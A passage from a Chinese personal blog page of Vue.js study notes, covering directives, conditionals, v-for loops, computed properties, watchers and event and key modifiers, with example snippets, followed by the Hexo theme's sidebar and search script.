class="undefined">      return this.message.split('').reverse().join('')</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">   watch:&#123;</span></span><br><span class="line"><span class="undefined">	//监听变量改变，函数名=需监听的变量名</span></span><br><span class="line"><span class="undefined">     use:function(val)&#123;</span></span><br><span class="line"><span class="undefined">	&#125;,</span></span><br><span class="line"><span class="undefined">   components: &#123;</span></span><br><span class="line"><span class="xml">    // <span class="tag">&lt;<span class="name">runoob</span>&gt;</span> 将只在父模板可用</span></span><br><span class="line"><span class="undefined">    'runoob': Child</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>实现单选框改变样式</p>
<h2 id="0x03-一些指令作用的记录"><a href="#0x03-一些指令作用的记录" class="headerlink" title="0x03 一些指令作用的记录"></a>0x03 一些指令作用的记录</h2><p>注意：必须要带双引号</p>
<ul>
<li>v-html   用于插入html标签</li>
<li>v-model  用户输入改变变量值</li>
<li>v-bind  用于绑定属性的值，可以是变量或者表达式之类的<ul>
<li>v-bind:class=“{‘class1’:var}” 通过var的true或false控制class的应用</li>
<li>v-bind:href=“url”  通过控制url的值来改变其链接，等于:href=“url”</li>
<li>v-biind:id=“‘a’+id”   通过js表达式改变值，等于:id=“‘a’+id”</li>
<li>……</li>
</ul>
</li>
<li>v-if=变量  根据变量的值进行判断是否应用</li>
<li>v-show=”ok” 可以展示元素</li>
<li>v-on:click=”reverseMessage”  类似于onclick的时候执行后面的函数，等于@click=”reverseMessage”<h2 id="0x04-条件语句"><a href="#0x04-条件语句" class="headerlink" title="0x04 条件语句"></a>0x04 条件语句</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">"type === 'A'"</span>&gt;</span></span><br><span class="line">      A</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else-if</span>=<span class="string">"type === 'B'"</span>&gt;</span></span><br><span class="line">      B</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else-if</span>=<span class="string">"type === 'C'"</span>&gt;</span></span><br><span class="line">      C</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else</span>&gt;</span></span><br><span class="line">      Not A/B/C</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">new Vue(&#123;</span></span><br><span class="line"><span class="undefined">  el: '#app',</span></span><br><span class="line"><span class="undefined">  data: &#123;</span></span><br><span class="line"><span class="undefined">    type: 'C'</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>上面是指令的写法，下面是字符串模版的写法<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Handlebars 模板 --&gt;</span></span><br><span class="line">&#123;&#123;#if ok&#125;&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Yes<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;&#123;/if&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="0x05-循环"><a href="#0x05-循环" class="headerlink" title="0x05 循环"></a>0x05 循环</h2><p>基本for循环使用<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"site in sites"</span>&gt;</span></span><br><span class="line">      &#123;&#123; site.name &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">new Vue(&#123;</span></span><br><span class="line"><span class="undefined">  el: '#app',</span></span><br><span class="line"><span class="undefined">  data: &#123;</span></span><br><span class="line"><span class="undefined">    sites: [</span></span><br><span class="line"><span class="undefined">      &#123; name: 'Runoob' &#125;,</span></span><br><span class="line"><span class="undefined">      &#123; name: 'Google' &#125;,</span></span><br><span class="line"><span class="undefined">      &#123; name: 'Taobao' &#125;</span></span><br><span class="line"><span class="undefined">    ]</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>模板中使用for循环<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-for</span>=<span class="string">"site in sites"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; site.name &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>--------------<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>迭代对象取keyvalue<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"(value, key, index) in object"</span>&gt;</span></span><br><span class="line">     &#123;&#123; index &#125;&#125;. &#123;&#123; key &#125;&#125; : &#123;&#123; value &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>循环取整数<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"n in 10"</span>&gt;</span></span><br><span class="line">     &#123;&#123; n &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="0x06-计算属性"><a href="#0x06-计算属性" class="headerlink" title="0x06 计算属性"></a>0x06 计算属性</h2><p>原始属性、计算属性、方法<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>原始字符串: &#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>计算后反转字符串: &#123;&#123; reversedMessage &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>使用方法后反转字符串: &#123;&#123; reversedMessage2() &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">var vm = new Vue(&#123;</span></span><br><span class="line"><span class="undefined">  el: '#app',</span></span><br><span class="line"><span class="undefined">  data: &#123;</span></span><br><span class="line"><span class="undefined">    message: 'Runoob!'</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  computed: &#123;</span></span><br><span class="line"><span class="undefined">    // 计算属性的 getter</span></span><br><span class="line"><span class="undefined">    reversedMessage: function () &#123;</span></span><br><span class="line"><span class="undefined">      // `this` 指向 vm 实例</span></span><br><span class="line"><span class="undefined">      return this.message.split('').reverse().join('')</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  methods: &#123;</span></span><br><span class="line"><span class="undefined">    reversedMessage2: function () &#123;</span></span><br><span class="line"><span class="undefined">      return this.message.split('').reverse().join('')</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>可以说使用 computed 性能会更好，但是如果你不希望缓存，你可以使用 methods 属性。<br>计算属性默认提供getter但是也可以设置setter<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">var vm = new Vue(&#123;</span></span><br><span class="line"><span class="undefined">  el: '#app',</span></span><br><span class="line"><span class="undefined">  data: &#123;</span></span><br><span class="line"><span class="undefined">    name: 'Google',</span></span><br><span class="line"><span class="undefined">    url: 'http://www.google.com'</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  computed: &#123;</span></span><br><span class="line"><span class="undefined">    site: &#123;</span></span><br><span class="line"><span class="undefined">      // getter</span></span><br><span class="line"><span class="undefined">      get: function () &#123;</span></span><br><span class="line"><span class="undefined">        return this.name + ' ' + this.url</span></span><br><span class="line"><span class="undefined">      &#125;,</span></span><br><span class="line"><span class="undefined">      // setter</span></span><br><span class="line"><span class="undefined">      set: function (newValue) &#123;</span></span><br><span class="line"><span class="undefined">        var names = newValue.split(' ')</span></span><br><span class="line"><span class="undefined">        this.name = names[0]</span></span><br><span class="line"><span class="undefined">        this.url = names[names.length - 1]</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined">// 调用 setter， vm.name 和 vm.url 也会被对应更新</span></span><br><span class="line"><span class="undefined">vm.site = '菜鸟教程 http://www.runoob.com';</span></span><br><span class="line"><span class="undefined">document.write('name: ' + vm.name);</span></span><br><span class="line"><span class="xml">document.write('<span class="tag">&lt;<span class="name">br</span>&gt;</span>');</span></span><br><span class="line"><span class="undefined">document.write('url: ' + vm.url);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="0x07-属性变更监听"><a href="#0x07-属性变更监听" class="headerlink" title="0x07 属性变更监听"></a>0x07 属性变更监听</h2><p>一个是watch，一个是vm.$watch(变量，回调)<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> = <span class="string">"computed_props"</span>&gt;</span></span><br><span class="line">    千米 : <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"text"</span> <span class="attr">v-model</span> = <span class="string">"kilometers"</span>&gt;</span></span><br><span class="line">    米 : <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"text"</span> <span class="attr">v-model</span> = <span class="string">"meters"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"info"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> = <span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    var vm = new Vue(&#123;</span></span><br><span class="line"><span class="undefined">    el: '#computed_props',</span></span><br><span class="line"><span class="undefined">    data: &#123;</span></span><br><span class="line"><span class="undefined">        kilometers : 0,</span></span><br><span class="line"><span class="undefined">        meters:0</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    methods: &#123;</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    computed :&#123;</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    watch : &#123;</span></span><br><span class="line"><span class="undefined">        kilometers:function(val) &#123;</span></span><br><span class="line"><span class="undefined">            this.kilometers = val;</span></span><br><span class="line"><span class="undefined">            this.meters = this.kilometers * 1000</span></span><br><span class="line"><span class="undefined">        &#125;,</span></span><br><span class="line"><span class="undefined">        meters : function (val) &#123;</span></span><br><span class="line"><span class="undefined">            this.kilometers = val/ 1000;</span></span><br><span class="line"><span class="undefined">            this.meters = val;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined">    // $watch 是一个实例方法</span></span><br><span class="line"><span class="undefined">    vm.$watch('kilometers', function (newValue, oldValue) &#123;</span></span><br><span class="line"><span class="undefined">    // 这个回调将在 vm.kilometers 改变后调用</span></span><br><span class="line"><span class="undefined">    document.getElementById ("info").innerHTML = "修改前值为: " + oldValue + "，修改后值为: " + newValue;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="0x07-修饰符"><a href="#0x07-修饰符" class="headerlink" title="0x07 修饰符"></a>0x07 修饰符</h2><p>事件修饰符<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 阻止单击事件冒泡 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-on:click.stop</span>=<span class="string">"doThis"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 提交事件不再重载页面 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">v-on:submit.prevent</span>=<span class="string">"onSubmit"</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 修饰符可以串联  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-on:click.stop.prevent</span>=<span class="string">"doThat"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 只有修饰符 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">v-on:submit.prevent</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 添加事件侦听器时使用事件捕获模式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-on:click.capture</span>=<span class="string">"doThis"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 只当事件在该元素本身（而不是子元素）触发时触发回调 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-on:click.self</span>=<span class="string">"doThat"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- click 事件只能点击一次，2.1.4版本新增 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-on:click.once</span>=<span class="string">"doThis"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>按键修饰符<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 只有在 keyCode 是 13 时调用 vm.submit() --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-on:keyup.13</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 同上 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-on:keyup.enter</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 缩写语法 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> @<span class="attr">keyup.enter</span>=<span class="string">"submit"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>全部的按键别名：<br>.enter<br>.tab<br>.delete (捕获 “删除” 和 “退格” 键)<br>.esc<br>.space<br>.up<br>.down<br>.left<br>.right<br>.ctrl<br>.alt<br>.shift<br>.meta<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="comment">&lt;!-- Alt + C --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> @<span class="attr">keyup.alt.67</span>=<span class="string">"clear"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Ctrl + Click --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> @<span class="attr">click.ctrl</span>=<span class="string">"doSomething"</span>&gt;</span>Do something<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/touxiang.png" alt="JOJO">
            
              <p class="site-author-name" itemprop="name">JOJO</p>
              <p class="site-description motion-element" itemprop="description">如果有一天我不再中二，变的和蔼可亲善解人意，那一定是我失去了最后的坚持变得安于平凡。那么请认识我的人清明的时候顺带为我上柱香，毕竟这个男人已经死了。</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">25</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">17</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">26</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Blogroll
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.sk15.net/" title="sk15" target="_blank">sk15</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">JOJO</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  








  
  





  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/three/three.min.js"></script>
  

  
  
    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
